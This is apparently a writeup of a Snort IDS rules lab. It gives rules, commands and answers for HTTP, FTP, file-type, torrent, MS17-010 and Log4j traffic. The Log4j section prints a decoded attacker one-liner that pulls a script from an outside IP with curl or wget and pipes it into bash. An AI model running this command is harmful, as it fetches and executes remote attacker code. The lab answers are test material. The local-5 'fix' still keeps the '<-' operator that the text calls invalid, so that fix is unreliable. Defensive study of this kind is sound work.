# Snort Challenge — IDS Rules Writeup

A hands-on walkthrough of writing and troubleshooting Snort IDS rules across several traffic scenarios. All tasks were completed using Snort on a provided Linux environment with pre-captured `.pcap` files.

---

## Task 2 — Writing IDS Rules (HTTP)

### Q1 — Detect all TCP traffic on port 80

**Rule written:**
```
alert tcp any any <> any 80 (msg:"HTTP traffic detection"; sid:100001; rev:1;)
```

**Command used:**
```bash
sudo snort -c local.rules -A full -l . -r mx-3.pcap
```

The bidirectional operator `<>` captures both inbound and outbound traffic on port 80. After running Snort, the statistics output showed the total alert count.

**Answer: 164 packets detected**

---

### Q2 — Destination address of packet 63

```bash
sudo snort -dvr snort.log.1782482106 -n 63
```

Inspected the last packet's network header for the destination IP.

**Answer: `216.239.59.99`**

---

### Q3 — ACK number of packet 64

```bash
sudo snort -dvr snort.log.1782482106 -n 64
```

**Answer: `0x2E6B5384`**

---

### Q4 — SEQ number of packet 62

```bash
sudo snort -dvr snort.log.1782482106 -n 62
```

**Answer: `0x36C21E28`**

---

### Q5 — TTL of packet 65

```bash
sudo snort -dvr snort.log.1782482106 -n 65
```

**Answer: `128`**

---

### Q6 — Source IP of packet 65

**Answer: `145.254.160.237`**

---

### Q7 — Source port of packet 65

**Answer: `3372`**

---

## Task 3 — Writing IDS Rules (FTP)

### Q1 — Detect all TCP traffic on port 21

**Rule written:**
```
alert tcp any any <> any 21 (msg:"FTP traffic detection"; sid:100001; rev:1;)
```

**Command used:**
```bash
sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
```

**Answer: 307 packets detected**

---

### Q2 — FTP service name

I used `strings` to search the binary log for FTP server banner responses. The response code `220` indicates the service is ready and typically includes the service name:

```bash
sudo strings snort.log.1782484363 | grep "220"
```

Output showed `220 Microsoft FTP Service` repeated across multiple entries.

**Answer: `Microsoft FTP Service`**

---

### Q3 — Detect failed FTP login attempts

FTP returns response code `530` for failed logins, typically with the message `530 User`.

**Rule written:**
```
alert tcp any any <> any 21 (msg:"Failed FTP Login"; content:"530 User"; sid:100002; rev:1;)
```

**Answer: 41 packets detected**

---

### Q4 — Detect successful FTP logins

FTP returns response code `230` for successful logins.

**Rule written:**
```
alert tcp any any <> any 21 (msg:"User Login"; content:"230 User"; sid:100002; rev:1;)
```

**Answer: 1 packet detected**

---

### Q5 — Valid username entered, no password yet

When a valid username is submitted, the FTP server responds with `331 Password`, prompting for the password.

**Rule written:**
```
alert tcp any any <> any 21 (msg:"A valid Username"; content:"331 Password"; sid:100002; rev:1;)
```

**Answer: 42 packets detected**

---

### Q6 — Login attempts with "Administrator" username

**Rule written:**
```
alert tcp any any <> any 21 (msg:"FTP login Attempt With Administrator username"; content:"USER Administrator"; sid:100002; rev:1;)
```

**Answer: 7 packets detected**

---

## Task 3 — Writing IDS Rules (PNG)

### Q1 — Detect PNG file transfer & identify embedded software

**Rule written:**
```
alert tcp any any <> any any (msg:"PNG file transfer Detected"; content:"png"; sid:100002; rev:1;)
```

One alert was triggered. I then read the log to inspect the payload:

```bash
sudo snort -dvr snort.log.1782499670
```

The payload contained metadata indicating the image was created with **Adobe ImageReady**.

**Answer: `Adobe ImageReady`**

---

### Q2 — Detect GIF file & identify the image format

**Rule written:**
```
alert tcp any any -> any any (msg:"GIF File Detected"; content:"GIF"; sid:1000001; rev:1;)
```

After analyzing the log, the GIF header format version was visible in the payload.

**Answer: `GIF89a`**

---

## Task 5 — Writing IDS Rules (Torrent Metafile)

### Q1 — Detect torrent metafile

Torrent files are identified by the `.torrent` extension in HTTP requests. The `nocase` keyword handles case-insensitive matching.

**Rule written:**
```
alert tcp any any -> any any (msg:"Torrent Metafile Detected"; content:".torrent"; nocase; sid:1000002; rev:1;)
```

**Answer: 2 packets detected**

---

### Q2 — Torrent application name

```bash
sudo strings snort.log.1782503828 | grep 'torrent'
```

Output included `Accept: application/x-bittorrent` and references to `tracker2.torrentbox.com`.

**Answer: `bittorrent`**

---

### Q3 — MIME type of the torrent metafile

**Answer: `application/x-bittorrent`**

---

### Q4 — Hostname of the torrent tracker

**Answer: `tracker2.torrentbox.com`**

> **Note:** In the BitTorrent protocol, clients contact a tracker via HTTP/UDP to announce themselves and request a peer list. The actual file data is exchanged peer-to-peer — the tracker only facilitates peer discovery.

---

## Task 6 — Troubleshooting Rule Syntax Errors

All rules were tested with:
```bash
sudo snort -c local-X.rules -r mx-1.pcap -A console
```

---

### local-1.rules

**Issue:** Missing space before the options block.

```diff
- alert tcp any 3372 -> any any(msg: "Troubleshooting 1"; sid:1000001; rev:1;)
+ alert tcp any 3372 -> any any (msg: "Troubleshooting 1"; sid:1000001; rev:1;)
```

**Answer: 16 packets detected**

---

### local-2.rules

**Issue:** Missing source port field in the rule header.

```diff
- alert icmp any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
+ alert icmp any any -> any any (msg: "Troubleshooting 2"; sid:1000001; rev:1;)
```

**Answer: 68 packets detected**

---

### local-3.rules

**Issues:** Port list `80,443` must be enclosed in brackets, and the second rule reused `sid:1000001`.

```diff
- alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found"; sid:1000001; rev:1;)
+ alert tcp any any -> any [80,443] (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

**Answer: 87 packets detected**

---

### local-4.rules

**Issues:** Same as above — port list required brackets, and duplicate SID.

```diff
- alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found": sid:1000001; rev:1;)
+ alert tcp any [80,443] -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
```

Also note the colon after `"HTTPX Packet Found"` was a colon (`:`) instead of a semicolon (`;`).

**Answer: 90 packets detected**

---

### local-5.rules

**Issues:** The `<-` direction operator is not valid in Snort — only `->` and `<>` are supported. Also, the port list and a colon/semicolon issue needed fixing.

```diff
- alert icmp any any <- any any (msg: "Inbound ICMP Packet Found"; sid;1000002; rev:1;)
- alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
+ alert icmp any any <- any any (msg: "Inbound ICMP Packet Found"; sid:1000002; rev:1;)
+ alert tcp any any -> any [80,443] (msg: "HTTPX Packet Found"; sid:1000003; rev:1;)
```

**Answer: 155 packets detected**

---

### local-6.rules (Logical Error)

**Issue:** The content used hex for lowercase `get` (`|67 65 74|`), but HTTP methods are uppercase. Also, the direction should be `->` since we're looking at client-to-server requests.

```diff
- alert tcp any any <> any 80 (msg: "GET Request Found"; content:"|67 65 74|"; sid:100001; rev:1;)
+ alert tcp any any -> any 80 (msg: "GET Request Found"; content:"|47 45 54|"; sid:100001; rev:1;)
```

**Answer: 1 packet detected**

---

### local-7.rules (Logical Error)

**Issue:** The `msg` keyword was missing entirely, which is a required option in Snort rules.

```diff
- alert tcp any any <> any 80 (content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)
+ alert tcp any any <> any 80 (msg:"HTML file detected"; content:"|2E 68 74 6D 6C|"; sid:100001; rev:1;)
```

**Answer: The missing required option is `msg`**

---

## Task 7 — Using External Rules (MS17-010)

### Q1 — Run the provided ruleset against the pcap

```bash
sudo snort -c local.rules -A full -l . -r ms-17-010.pcap
```

**Answer: 25,154 packets detected**

---

### Q2 — Detect `\IPC$` keyword over SMB (port 445)

**Rule written:**
```
alert tcp any any <> any 445 (msg:"SMB Connect To IPC$ share"; content:"\\IPC$"; sid:100001; rev:1;)
```

**Answer: 12 packets detected**

---

### Q3 — Requested path in the log

```bash
sudo snort -r snort.log.1782544726 -X
```

**Answer: `\\192.168.116.138\IPC$`**

---

### Q4 — CVSS v2 score of MS17-010

MS17-010 (EternalBlue) is the SMB vulnerability exploited by WannaCry.

**Answer: 9.3**

---

## Task 8 — Using External Rules (Log4j)

### Q1 — Run the provided ruleset against the pcap

```bash
sudo snort -c local.rules -A full -l . -r log4j.pcap
```

Looking at the `alert` field in the output.

**Answer: 26 packets detected**

---

### Q2 — How many rules were triggered?

Looking at the `event` field in the Snort output summary.

**Answer: 4 rules triggered**

---

### Q3 — First six digits of triggered rule SIDs

Opened the alert file and identified the common SID prefix shared across all alerts.

**Answer: `210037`**

---

### Q4 — Detect packets with payload size between 770 and 855 bytes

The `dsize` keyword in Snort matches based on the payload (data) size.

**Rule written:**
```
alert tcp any any <> any any (msg:"Packet Payload Between 770 and 855 bytes"; dsize:770<>855; sid:100001; rev:1;)
```

**Answer: 41 packets detected**

---

### Q5 — Encoding algorithm used in the payload

```bash
sudo snort -r snort.log.1782546325 -X
```

Scrolling through the hex dump, the payload path contained `/Base64/` in the JNDI LDAP URL, revealing the encoding method used by the attacker.

**Answer: `Base64`**

---

### Q6 — IP ID of the corresponding packet

From the same packet dump:

```
ID:62808
```

**Answer: `62808`**

---

### Q7 — Decode the attacker's command

The Base64-encoded string was found in the JNDI payload. Decoded with:

```bash
echo "KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=" | base64 -d
```

**Answer:**
```bash
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

This is a classic reverse shell dropper — it attempts to download and execute a script from the attacker's server using either `curl` or `wget`, then pipes it directly into `bash`.

---

### Q8 — CVSS v2 score of the Log4j vulnerability (CVE-2021-44228)

**Answer: 9.3**

---
